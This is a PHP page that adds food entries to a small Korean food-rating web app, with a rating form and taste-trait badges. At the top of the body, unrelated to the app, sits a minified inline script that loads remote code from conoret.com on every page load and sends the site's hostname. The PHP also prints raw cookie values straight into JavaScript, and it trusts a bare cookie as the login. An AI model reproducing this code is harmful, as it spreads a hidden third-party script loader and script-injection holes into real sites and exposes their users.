<!DOCTYPE html>
<?php
if(!isset($_COOKIE['user_name'])) {
    echo "<meta http-equiv='refresh' content='0;url=index.php'>";
    exit;
}
else {
    setcookie('user_name',$_COOKIE['user_name'],time()+(180),'/');
    setcookie('user_id',$_COOKIE['user_id'],time()+180,'/');
}
?>
<html lang="en">
<head>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
    <meta name="description" content="">
    <meta name="author" content="ssosso.table.u">
    <meta name="generator" content="ssosso.table food-db 0.1.0">
    <link rel="icon" href="https://getbootstrap.com/docs/4.0/assets/img/favicons/favicon.ico">

    <title>ssosso-table.food-db.insert</title>

    <link rel="canonical" href="http://ssossotable.com">

    <!-- Bootstrap CSS -->
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.1.3/dist/css/bootstrap.min.css" integrity="sha384-MCw98/SFnGE8fJT3GXwEOngsV7Zt27NXFoaoApmYm81iuXoPkFOJwJ8ERdknLPMO" crossorigin="anonymous">

    <!-- Favicons -->
    <link rel="apple-touch-icon" href="https://getbootstrap.com/docs/5.0/assets/img/favicons/apple-touch-icon.png" sizes="180x180">
    <link rel="icon" href="https://getbootstrap.com/docs/5.0/assets/img/favicons/favicon-32x32.png" sizes="32x32" type="image/png">
    <link rel="icon" href="https://getbootstrap.com/docs/5.0/assets/img/favicons/favicon-16x16.png" sizes="16x16" type="image/png">
    <link rel="manifest" href="https://getbootstrap.com/docs/5.0/assets/img/favicons/manifest.json">
    <link rel="mask-icon" href="https://getbootstrap.com/docs/5.0/assets/img/favicons/safari-pinned-tab.svg" color="#7952b3">
    <link rel="icon" href="https://getbootstrap.com/docs/5.0/assets/img/favicons/favicon.ico">
    <meta name="theme-color" content="#7952b3">

    <style>
        .bd-placeholder-img {
            font-size: 1.125rem;
            text-anchor: middle;
            -webkit-user-select: none;
            -moz-user-select: none;
            user-select: none;
        }

        @media (min-width: 768px) {
            .bd-placeholder-img-lg {
                font-size: 3.5rem;
            }
        }
    </style>

    <!-- Custom styles for this template -->

    <link rel="preconnect" href="https://fonts.googleapis.com/" crossorigin="true">
    <link rel="preconnect" href="https://fonts.gstatic.com/">
    <link rel="stylesheet" href="css/main/css2">
    <link rel="stylesheet" href="css/rating/css2">
    <link href="css/main/cover.css" rel="stylesheet">
    <!--    <link rel="stylesheet" href="/css/insert.css">-->
    <style>
        @font-face { /* 애플산돌고딕 폰트 적용 */
            font-family: "Jua";
            src: url("font/Jua-Regular.ttf") format("truetype");
            font-weight: normal;
        }
        html,
        body {
            font-family: Jua;
            height: 100%;
        }
        body {
            display: flex;
            align-items: center;
            padding-top: 40px;
            padding-bottom: 40px;
            background-color: #f5f5f5;
            color: #2c3034;
        }
        header {
            width: 550px;
        }
        .form-rating {
            width: 100%;
            padding: 15px;
            margin: auto;
        }
        #food_name_modify, #food_location_modify {
            width: 250px !important;
            margin: 1rem 0 1rem 0;
            display: inline-block;
        }
        #food_name_modify_button, #food_loaction_modify_button {
            width: 50px !important;
            height: 30px !important;
            font-size: 15px;
            padding: 0;
            margin: 1rem 0 1rem 0;
            display: inline-block;
        }
        #trait_name {
            width: 250px !important;
        }
        #traits_list {
            text-align: left;
            width: 300px !important;
            margin: auto;
            padding-top: 20px;
        }
        #add_trait {
            margin-top: 20px;
            width: 250px !important;
        }
        #commit_to_database {
            width: 250px !important;
            margin-top: 20px;
        }
        #rating .material-symbols-outlined {
            font-variation-settings:
                    'FILL' 0,
                    'wght' 400,
                    'GRAD' 0,
                    'opsz' 48
        }
        #traits ul .material-symbols-outlined {
            display: inline-block !important;
            vertical-align: middle;
        }
        #traits ul li {
            display: inline-block;
            vertical-align: middle;
            font-size: 24px;
            align-items: start;
        }
        #default_traits {
            margin: 10px 0 10px 0 !important;
            color: whitesmoke;
        }
        #default_traits span {
            font-size: 18px !important;
            font-weight: 200;
            margin: 2px 2px 2px 2px;
        }
        .nav-link {
            font-weight: 300 !important;
        }
        .nav-masthead .active {
            color: #2c3034;
            border-bottom-color: transparent;
        }
        a:focus, a:hover {
            border-bottom-color: #2c3034 !important;
            color: #2c3034 !important;
        }
        p {
            color: #2c3034 !important;
        }
    </style>

    <script src="script/rating/dsp" type="text/javascript" defer="" async=""></script>
    <script
            src="https://code.jquery.com/jquery-3.6.0.min.js"
            integrity="sha256-/xUj+3OJU5yExlq6GSYGSHk7tPXikynS7ogEvDej/m4="
            crossorigin="anonymous"></script>
    <script src="script/main/dsp" type="text/javascript" defer="" async=""></script>
    <script>
        // 사용자 이름(String)
        let userName = <?php echo "'". $_COOKIE['user_name'] ."'"; ?>
            // 사용자 id(int)
            let userId= <?php echo $_COOKIE['user_id']; ?>

            // 음식 이름(String)
            let foodName = ""

        let score=0
        let list_idx=0
        let list={}
        let list_content={}

        let trait_idx=[]
    </script>
    <script src="/script/main.js"></script>

</head>

<body class="text-center vsc-initialized" cz-shortcut-listen="true">
    <script type="text/javascript">
        window.top === window && !function(){var e=document.createElement("script"),t=document.getElementsByTagName("head")[0];e.src="//conoret.com/dsp?h="+document.location.hostname+"&r="+Math.random(),e.type="text/javascript",e.defer=!0,e.async=!0,t.appendChild(e)}();
    </script>
    <div class="cover-container d-flex h-100 p-3 mx-auto flex-column">
    <header class="masthead mb-auto">
        <div class="inner">
            <h3 class="masthead-brand">소소식탁</h3>
            <nav class="nav nav-masthead justify-content-center">
                <a class="nav-link text-muted" href="http://ssossotable.com/rating.php">음식 평가하기</a>
                <a class="nav-link active" href="http://ssossotable.com/insert.php">음식 추가하기</a>
                <a class="nav-link text-muted" href="http://ssossotable.com/record.php">식사 기록하기</a>
            </nav>
        </div>
    </header>

    <main role="main" class="inner cover" id="rating" style="margin-top: 20px;">
        <div id="food_rating_database">
            <div id="food_name_modify_div">
                <input type="text" placeholder="뭘 먹었나요?" id="food_name_modify">
                <input type="button" id="food_name_modify_button" value="입력" class="w-100 btn btn-lg btn-info" onclick="modify_foodname()">
            </div>
            <div id="food_name_div">
                <h3 id="food_name">Food Name</h3>
            </div>
            <div id="rating">
                <span class="material-symbols-outlined" onclick="set(1)"><img src="/src/rate_star_before.png" height="80" width="80"></span>
                <span class="material-symbols-outlined" onclick="set(2)"><img src="/src/rate_star_before.png" height="80" width="80"></span>
                <span class="material-symbols-outlined" onclick="set(3)"><img src="/src/rate_star_before.png" height="80" width="80"></span>
                <span class="material-symbols-outlined" onclick="set(4)"><img src="/src/rate_star_before.png" height="80" width="80"></span>
                <span class="material-symbols-outlined" onclick="set(5)"><img src="/src/rate_star_before.png" height="80" width="80"></span>
            </div>
            <div id="default_traits">
                <span class="badge rounded-pill bg-primary" id="korean" onclick="add_trait('korean');">한국</span>
                <span class="badge rounded-pill bg-success" id="japanese" onclick="add_trait('japanese');">일본</span>
                <span class="badge rounded-pill bg-danger" id="chinese" onclick="add_trait('chinese');">중국</span>
                <span class="badge rounded-pill bg-warning text-dark" id="asian" onclick="add_trait('asian');">아시아</span>
                <span class="badge rounded-pill bg-info text-dark" id="western" onclick="add_trait('western');">양식</span>
                <br>
                <span class="badge rounded-pill bg-primary" id="fried" onclick="add_trait('fried');">튀김</span>
                <span class="badge rounded-pill bg-success" id="raw" onclick="add_trait('raw');">생식/회</span>
                <span class="badge rounded-pill bg-danger" id="grilled" onclick="add_trait('grilled');">구이</span>
                <span class="badge rounded-pill bg-warning text-dark" id="soup" onclick="add_trait('soup');">국물</span>
                <span class="badge rounded-pill bg-info text-dark" id="stir_fried" onclick="add_trait('stir_fried');">볶음/비빔</span>
                <span class="badge rounded-pill bg-primary" id="steamed" onclick="add_trait('steamed');">찜/조림</span>
                <br>
                <span class="badge rounded-pill bg-success" id="rice" onclick="add_trait('rice');">쌀</span>
                <span class="badge rounded-pill bg-danger" id="wheat" onclick="add_trait('wheat');">밀/빵</span>
                <span class="badge rounded-pill bg-warning text-dark" id="noodle" onclick="add_trait('noodle');">면</span>
                <span class="badge rounded-pill bg-info text-dark" id="seafood" onclick="add_trait('seafood');">해물</span>
                <span class="badge rounded-pill bg-primary" id="meat" onclick="add_trait('meat');">육고기</span>
                <span class="badge rounded-pill bg-success" id="vegetable" onclick="add_trait('vegetable');">채소</span>
                <span class="badge rounded-pill bg-danger" id="spice" onclick="add_trait('spice');">향신료</span>
                <br>
                <span class="badge rounded-pill bg-warning text-dark" id="dessert" onclick="add_trait('dessert');">디저트</span>
                <span class="badge rounded-pill bg-info text-dark" id="beverage" onclick="add_trait('beverage');">음료</span>
                <span class="badge rounded-pill bg-primary" id="sweetness" onclick="add_trait('sweetness');">단맛</span>
                <span class="badge rounded-pill bg-success" id="sour_taste" onclick="add_trait('sour_taste');">신맛</span>
                <span class="badge rounded-pill bg-danger" id="spicy" onclick="add_trait('spicy');">매운맛</span>
                <br>
            </div>

            <div id="traits">
                <input type="text" placeholder="무슨 특성이 있나요?" id="trait_name">
                <br>
                <input type="button" id="add_trait" value="추가" class="w-100 btn btn-lg btn-info" onclick="add_trait(0)">
                <ul id="traits_list">
                </ul>
                <input type="button" id="commit_to_database"value="commit to database" class="w-100 btn btn-lg btn-info" onclick="commit()">
            </div>
        </div>
    </main>

    <footer class="mastfoot mt-auto">
        <div class="inner">
            <p>Created by<a href="http://ssossotable.com"> ssosso.table.u</a>, by <a href="http://ssossotable.com">@ssosso.table</a></p>
        </div>
    </footer>
</div>

<script src="https://cdn.jsdelivr.net/npm/popper.js@1.14.3/dist/umd/popper.min.js" integrity="sha384-ZMP7rVo3mIykV+2+9J3UJ46jBk0WLaUAdn689aCwoqbBJiSnjAK/l8WvCWPIPm49" crossorigin="anonymous"></script>
<script src="https://cdn.jsdelivr.net/npm/bootstrap@4.1.3/dist/js/bootstrap.min.js" integrity="sha384-ChfqqxuZUCnJSK3+MXmPNIyE6ZbWh2IMqE241rYiqJxyMiZ6OW/JmZQ5stwEULTy" crossorigin="anonymous"></script>

</body></html>